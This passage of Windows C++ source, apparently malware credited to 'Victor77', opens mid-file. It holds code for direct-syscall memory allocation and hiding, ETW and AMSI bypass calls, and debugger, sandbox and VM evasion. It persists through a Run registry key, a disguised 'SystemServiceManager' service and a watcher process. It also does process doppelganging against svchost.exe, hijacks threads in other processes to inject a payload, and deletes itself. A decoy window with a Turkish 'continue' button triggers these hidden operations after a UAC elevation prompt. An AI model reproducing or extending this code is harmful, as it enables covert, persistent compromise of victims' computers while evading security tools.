                return *(DWORD*)(pFunction + i + 1);
            }
        }
#endif
        return 0;
    }

    static NTSTATUS ExecuteSyscall(DWORD syscallNumber, ...) {
        NTSTATUS status = 0;
#ifdef _WIN64
        va_list args;
        va_start(args, syscallNumber);
        
        // x64 assembly implementation
        DWORD64 arg1 = va_arg(args, DWORD64);
        DWORD64 arg2 = va_arg(args, DWORD64);
        DWORD64 arg3 = va_arg(args, DWORD64);
        DWORD64 arg4 = va_arg(args, DWORD64);
        DWORD64 arg5 = va_arg(args, DWORD64);
        DWORD64 arg6 = va_arg(args, DWORD64);
        
        DWORD64 _syscallNumber = syscallNumber;
        
        __asm {
            mov r10, rcx
            mov eax, _syscallNumber
            syscall
            mov status, eax
        }
        
        va_end(args);
#else
        // x86 implementation
        __asm {
            mov eax, syscallNumber
            mov edx, fs:[0xC0]
            call edx
            mov status, eax
        }
#endif
        return status;
    }
    
public:
    static NTSTATUS SyscallAllocateMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        SIZE_T Size,
        ULONG Protect) {
            
        DWORD syscallNumber = GetSyscallNumber("NtAllocateVirtualMemory");
        SIZE_T regionSize = Size;
        
        return ExecuteSyscall(syscallNumber,
            (DWORD64)ProcessHandle,
            (DWORD64)BaseAddress,
            (DWORD64)0,
            (DWORD64)&regionSize,
            (DWORD64)(MEM_COMMIT | MEM_RESERVE),
            (DWORD64)Protect);
    }
    
    static NTSTATUS SyscallProtectMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        SIZE_T Size,
        ULONG NewProtect) {
            
        DWORD syscallNumber = GetSyscallNumber("NtProtectVirtualMemory");
        ULONG oldProtect;
        
        return ExecuteSyscall(syscallNumber,
            (DWORD64)ProcessHandle,
            (DWORD64)BaseAddress,
            (DWORD64)&Size,
            (DWORD64)NewProtect,
            (DWORD64)&oldProtect);
    }
};

class MemorySubversion {
private:
    static void HideMemoryRegion(LPVOID address, SIZE_T size) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(address, &mbi, sizeof(mbi))) {
            DirectSyscall::SyscallProtectMemory(
                GetCurrentProcess(),
                &address,
                size,
                PAGE_NOACCESS);
        }
    }
    
    static void UnhideMemoryRegion(LPVOID address, SIZE_T size, DWORD protection) {
        DirectSyscall::SyscallProtectMemory(
            GetCurrentProcess(),
            &address,
            size,
            protection);
    }
    
public:
    static LPVOID AllocateHiddenMemory(SIZE_T size) {
        LPVOID address = NULL;
        DirectSyscall::SyscallAllocateMemory(
            GetCurrentProcess(),
            &address,
            size,
            PAGE_EXECUTE_READWRITE);
            
        if (address) {
            HideMemoryRegion(address, size);
        }
        return address;
    }
    
    static void WriteHiddenMemory(LPVOID address, const void* buffer, SIZE_T size) {
        UnhideMemoryRegion(address, size, PAGE_EXECUTE_READWRITE);
        memcpy(address, buffer, size);
        HideMemoryRegion(address, size);
    }
};

void InitializeSecurity() {
    ETWBypass::DisableETW();
    AMSIBypass::DisableAMSI();
}

class AutoRestart {
private:
    static std::atomic<bool> isWatcherRunning;
    static HANDLE hMutex;
    static const wchar_t* MUTEX_NAME;
    static const wchar_t* RESTART_EVENT_NAME;
    
    static void CreateWatcherProcess() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi;
        
        std::wstring cmdLine = std::wstring(exePath) + L" --watcher";
        
        CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(),
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            NULL, NULL, &si, &pi);
            
        if (pi.hProcess) {
            SetPriorityClass(pi.hProcess, HIGH_PRIORITY_CLASS);
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    static void WatcherThread() {
        while (isWatcherRunning) {
            HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, RESTART_EVENT_NAME);
            if (WaitForSingleObject(hEvent, 1000) == WAIT_OBJECT_0) {
                RestartApplication();
                ResetEvent(hEvent);
            }
            CloseHandle(hEvent);
        }
    }
    
    static void RestartApplication() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi;
        
        std::wstring cmdLine = std::wstring(exePath) + L" --restarted";
        
        if (CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(),
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            NULL, NULL, &si, &pi)) {
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    static LONG WINAPI UnhandledExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) {
        SignalRestart();
        return EXCEPTION_EXECUTE_HANDLER;
    }
    
public:
    static void Initialize() {
        MUTEX_NAME = L"Global\\Victor77_Mutex";
        RESTART_EVENT_NAME = L"Global\\Victor77_RestartEvent";
        
        hMutex = CreateMutexW(NULL, FALSE, MUTEX_NAME);
        
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(hMutex);
            return;
        }
        
        SetUnhandledExceptionFilter(UnhandledExceptionHandler);
        
        std::thread watcherThread(WatcherThread);
        watcherThread.detach();
        
        CreateWatcherProcess();
    }
    
    static void SignalRestart() {
        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, RESTART_EVENT_NAME);
        if (hEvent) {
            SetEvent(hEvent);
            CloseHandle(hEvent);
        }
    }
    
    static void Cleanup() {
        isWatcherRunning = false;
        if (hMutex) {
            CloseHandle(hMutex);
        }
    }
    
    static bool IsWatcherInstance(int argc, wchar_t* argv[]) {
        for (int i = 1; i < argc; i++) {
            if (wcscmp(argv[i], L"--watcher") == 0) {
                return true;
            }
        }
        return false;
    }
    
    static void RegisterAutoStart() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, REG_OPTION_NON_VOLATILE,
            KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, L"SystemServiceManager",
                0, REG_SZ, (BYTE*)exePath,
                (wcslen(exePath) + 1) * sizeof(wchar_t));
            
            RegCloseKey(hKey);
        }
    }
    
    static void InstallService() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (hSCManager) {
            SC_HANDLE hService = CreateServiceW(hSCManager,
                L"SystemServiceManager",
                L"System Service Manager",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                exePath,
                NULL, NULL, NULL, NULL, NULL);
                
            if (hService) {
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
};

std::atomic<bool> AutoRestart::isWatcherRunning(true);
HANDLE AutoRestart::hMutex = NULL;
const wchar_t* AutoRestart::MUTEX_NAME;
const wchar_t* AutoRestart::RESTART_EVENT_NAME;

void ExecuteHiddenOperations() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    InitializeSecurity();
    
    if (IsDebuggerPresentCustom() || CheckSandbox() || IsVirtualMachine()) {
        ExitProcess(0);
    }
    
    AutoRestart::Initialize();
    AutoRestart::RegisterAutoStart();
    AutoRestart::InstallService();
    
    SIZE_T payloadSize = 1024 * 1024;
    LPVOID hiddenMemory = MemorySubversion::AllocateHiddenMemory(payloadSize);
    
    SystemCamouflage::HideInSystemDirectory();
    
    wchar_t system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);
    std::wstring targetPath = std::wstring(system32) + L"\\svchost.exe";
    
    ProcessDoppelganger::Execute(targetPath.c_str());
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        
        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == GetCurrentProcessId()) continue;
                
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) {
                    GargoyleROP::HijackThread(hThread, (LPVOID)InjectPayload);
                    CloseHandle(hThread);
                }
            } while (Thread32Next(hSnapshot, &te));
        }
        CloseHandle(hSnapshot);
    }
    
    SelfDelete();
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_COMMAND:
            if (LOWORD(wParam) == 1) {
                ShowWindow(hwnd, SW_HIDE);
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteHiddenOperations, NULL, 0, NULL);
                return 0;
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // UAC yükseltme kontrolü
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = szPath;
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;
    
    if (!(GetKeyState(VK_SHIFT) & 0x8000)) {
        if (ShellExecuteExW(&sei)) {
            return 0;
        }
    }
    
    // Ana pencere oluşturma
    const wchar_t CLASS_NAME[] = L"Win32App";
    
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hIcon = LoadIconW(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursorW(NULL, IDC_ARROW);
    
    RegisterClassW(&wc);
    
    HWND hwnd = CreateWindowExW(
        0,
        CLASS_NAME,
        L"Developed By Victor77",
        WS_OVERLAPPEDWINDOW & ~(WS_MAXIMIZEBOX | WS_MINIMIZEBOX | WS_THICKFRAME),
        CW_USEDEFAULT, CW_USEDEFAULT,
        400, 200,
        NULL,
        NULL,
        hInstance,
        NULL
    );
    
    if (hwnd == NULL) return 0;
    
    // Pencereyi ekranın ortasına konumlandır
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int xPos = (GetSystemMetrics(SM_CXSCREEN) - (rc.right - rc.left)) / 2;
    int yPos = (GetSystemMetrics(SM_CYSCREEN) - (rc.bottom - rc.top)) / 2;
    SetWindowPos(hwnd, NULL, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
    
    // Butonu oluştur
    CreateWindowW(
        L"BUTTON",
        L"Tamamdır, Devam Et!",
        WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
        130, 80, 140, 30,
        hwnd,
        (HMENU)1,
        hInstance,
        NULL
    );
    
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
} 
